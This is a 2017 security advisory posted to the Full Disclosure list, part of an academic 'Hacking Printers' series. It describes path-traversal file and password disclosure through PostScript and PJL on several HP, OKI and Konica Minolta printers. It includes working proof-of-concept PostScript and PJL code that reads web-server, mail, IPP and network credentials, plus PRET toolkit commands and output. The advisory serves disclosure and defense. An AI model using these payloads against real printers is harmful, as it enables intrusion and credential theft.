@@ -1,0 +1,205 @@
+
+Date: Mon, 30 Jan 2017 13:43:16 +0100
+From: Jens Müller <jens.a.mueller@....de>
+To: fulldisclosure@...lists.org
+Subject: [FD] Hacking Printers Advisory 2/6: Various HP/OKI/Konica printers
+ file/password disclosure via PostScript/PJL
+
+TL;DR:  In the scope of academic research on printer security, various
+vulnerabilities in network printers and MFPs have been discovered. This
+is advisory 2 of 6 of the `Hacking Printers' series. Each advisory
+discusses multiple issues of the same category. This post is about
+accessing a printers file system through ordinary PostScript or PJL
+based print jobs -- since decades a documented feature of both
+languages. The attack can be performed by anyone who can print, for
+example through USB or network. It can even be carried out by a
+malicious website, using advanced cross-site printing techniques in
+combination with a novel technique we call `CORS spoofing' (see
+http://hacking-printers.net/wiki/index.php/Cross-site_printing).
+
+============[ File System Access with PostScript and PJL ]============
+
+-------------------------[ Affected Devices ]-------------------------
+
+Various printers are likely to be affected as the weakness is based on
+PostScript and PJL, two generic printing languages supported by most
+laser printers. In a test with 20 printers, a vast majority allowed
+access to the file system using PostScript, however it was sandboxed to
+a certain directory on most printers, which limits the impact. Devices
+that are vulnerable to path traversal or where we could obtain sensitive
+information are listed below:
+
+- HP LaserJet 4200N (Firmware version: 20050602)
+- HP LaserJet 4250N (Firmware version: 20150130)
+- OKI MC342dn (Firmware version: A12.80_0_5)
+- Konica Minolta bizhub C454e (Firmware: unknown)
+
+Vendors informed: 2016-10-17
+
+--------------------[ Vulnerability Description ]---------------------
+
+PJL and PostScript both offer legitimate file operations. On some
+LaserJets, the whole file system can be accessed. This is a known issue
+(see CVE-2010-4107 and CVE-2012-5221). In the HPSBPI02575 security
+bulletin, HP promotes disabling file system access and setting a PJL
+password as countermeasures. PJL passwords however can be cracked within
+minutes due to their limited key size (1..65535). For PostScript, the
+issue has been fixed in current firmware versions by limiting file
+system access to a certain directory. The protection mechanism however
+is flawed: By using %*% as disk prefix and replacing ../ with .././ the
+whole file system can be accessed even for the latest firmware versions.
+The impact is significant: Passwords for the embedded web server can be
+found in /dev/rdsk_jdi_cfg0 while raw access to the RAM device available
+via /dev/dsk_ram0. Proof-of-concept PostScript code tested on the HP
+LaserJet 4250N is given below. It can be deployed to the printer using
+netcat (`nc printer 9100').
+
+----------------------------------------------------------------------
+%!
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%% LIST ROOT DIRECTORY %%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+/str 256 string def (%*%.././../../**)
+{print (\n) print} str filenameforall
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%% OBTAIN EWS PASSWORD %%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+/byte (0) def
+/infile (%*%.././../../dev/rdsk_jdi_cfg0) (r) file def
+{ infile read {byte exch 0 exch put
+(%stdout) (w) file byte writestring}
+{infile closefile exit} ifelse
+} loop
+----------------------------------------------------------------------
+
+The HP LaserJet 4250N furthermore contains a file named
+webServer/config/soe.xml which holds the password to a user-set email
+account for sending/receiving status information. Proof-of-concept PJL
+code is given below (replace X by the size of the soe.xml file which is
+obtained from the directory listing). Again, netcat can be used to
+deploy the code to port 9100 of the printer.
+
+----------------------------------------------------------------------
+@PJL COMMENT "LIST CONFIG DIRECTORY"
+@PJL FSDIRLIST NAME="0:\webServer\config" ENTRY=1 COUNT=65535
+@PJL COMMENT "OBTAIN MAIL PASSWORD"
+@PJL FSUPLOAD NAME="0:\webServer\config\soe.xml" OFFSET=0 SIZE=X
+
+<listener name="email" port="110" secure="false"
+class="hp.JetDirectPOP3Listener">
+    <pop3server server="mail.company.com"/>
+    <username user="someone"/>
+    <password pwd="S3cret"/>
+----------------------------------------------------------------------
+
+The OKI MC342dn allows one level of path traversal, where a directory
+called `hidden' is located which contains stored fax numbers, email
+contacts and local users' PINs as well as the SNMP community string and
+password. If the MFP is integrated into a network using features like
+Email-to-Print or Scan-to-FTP the `hidden' directory also holds
+passwords for LDAP, POP3, SMTP, out-bound HTTP proxy, FTP, SMB and
+Webdav as well as the IPsec and Wi-Fi pre-shared keys. Example
+PostScript code is given below.
+
+----------------------------------------------------------------------
+%!
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%% LIST HIDDEN DIRECTORY %%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+/str 256 string def (%*%../hidden/*)
+{print (\n) print} str filenameforall
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%% OBTAIN PASSWORD FILE %%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+/byte (0) def
+/infile
+(../../../hidden/system/NIC_EJ1/slot1/configuration/latest/D63FB0.cfg)
+(r) file def
+{ infile read {byte exch 0 exch put
+(%stdout) (w) file byte writestring}
+{infile closefile exit} ifelse
+} loop
+----------------------------------------------------------------------
+
+Note that the `hidden' directory on the OKI MC342dn does not appear in
+PJL directory listings, however it can be accessed as in PostScript once
+the name is known. Example PJL code is given below (where X is the
+correct file size obtained from the directory listing).
+
+----------------------------------------------------------------------
+@PJL COMMENT "LIST CONFIG DIRECTORY"
+@PJL FSDIRLIST NAME="0:/../hidden/system" ENTRY=1 COUNT=65535
+@PJL COMMENT "OBTAIN IPP PASSWORDS"
+@PJL FSUPLOAD NAME="0:/../hidden/system/ippuser.dat" OFFSET=0 SIZE=X
+----------------------------------------------------------------------
+
+On the Konica Minolta bizhub C454e, the contents of the root directory
+can be listed using path traversal.
+
+----------------------------------------------------------------------
+@PJL COMMENT "LIST ROOT DIRECTORY"
+@PJL FSDIRLIST NAME="0:/../../.." ENTRY=1 COUNT=65535
+----------------------------------------------------------------------
+
+In addition, the file ../sysdata/acc/job.csv can be read/written, which
+contains logged print job metadata, including document titles and
+usernames (X, again, is the correct file size obtained from the
+directory listing).
+
+----------------------------------------------------------------------
+@PJL COMMENT "LIST ACCOUNTING DIRECTORY"
+@PJL FSQUERY NAME="0:/../sysdata/acc"
+@PJL COMMENT "OBTAIN ACCOUNTING DATA"
+@PJL FSUPLOAD NAME="0:/../sysdata/acc/job.csv" OFFSET=0 SIZE=X
+----------------------------------------------------------------------
+
+-------------------------[ Proof of Concept ]-------------------------
+
+To simplify PostScript and PJL based file system access on printers, a
+Python based proof of concept software entitled Printer Exploitation
+Toolkit (PRET) has been published. It can be used as follows:
+
+$ git clone https://github.com/RUB-NDS/PRET.git
+$ cd PRET
+$ ./pret.py -q printer ps
+Connection to printer established
+
+Welcome to the pret shell. Type help or ? to list commands.
+printer:/> ls ../..
+d        -   Jan  1  1970 (created Jan  1  1970)  bootdev
+d        -   Jan  1  1970 (created Jan  1  1970)  dsk_jdi
+d        -   Jan  1  1970 (created Jan  1  1970)  dsk_jdi_ss
+d        -   Jan  1  1970 (created Jan  1  1970)  dsk_ram0
+d        -   Jan  1  1970 (created Jan  1  1970)  etc
+d        -   Jan  1  1970 (created Jan  1  1970)  tmp
+d        -   Jan  1  1970 (created Jan  1  1970)  webServer
+
+The directory listing is obtained from a HP LaserJet 4200N printer.
+Arbitrary files can be uploaded and downloaded. Similar functionality
+can be achieved using PRET in PJL mode:
+
+$ ./pret.py -q printer pjl
+Connection to printer established
+
+Welcome to the pret shell. Type help or ? to list commands.
+printer:/> ls ..
+d        -   bootdev
+d        -   dsk_jdi
+d        -   dsk_jdi_ss
+d        -   dsk_ram0
+d        -   etc
+d        -   lrt
+d        -   tmp
+d        -   webServer
+d        -   xps
+
+-----------------------[ Further Information ]------------------------
+
+Information on this bug/feature of PostScript and PJL can be found at:
+http://hacking-printers.net/wiki/index.php/File_system_access
+http://hacking-printers.net/wiki/index.php/Credential_disclosure
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
